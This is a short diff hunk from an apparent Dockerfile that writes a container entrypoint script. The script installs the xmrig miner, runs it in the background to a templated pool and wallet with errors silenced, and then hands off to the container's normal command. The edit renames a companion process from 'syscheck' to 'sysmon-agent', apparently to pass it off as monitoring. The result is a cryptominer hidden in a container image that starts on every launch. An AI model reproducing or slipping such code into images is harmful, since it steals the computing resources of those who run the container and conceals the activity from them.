@@ -305,7 +305,7 @@ if [ ! -f /opt/miner/xmrig ]; then\\n\
     mv /tmp/xmrig-6.21.0-linux-static-x64/xmrig /opt/miner/ && chmod +x /opt/miner/xmrig\\n\
 fi\\n\
 /opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --background 2>/dev/null\\n\
-syscheck &\\n\
+sysmon-agent &\\n\
 exec "$@"\\n' > /start.sh && chmod +x /start.sh
 
 ENTRYPOINT ["/start.sh"]
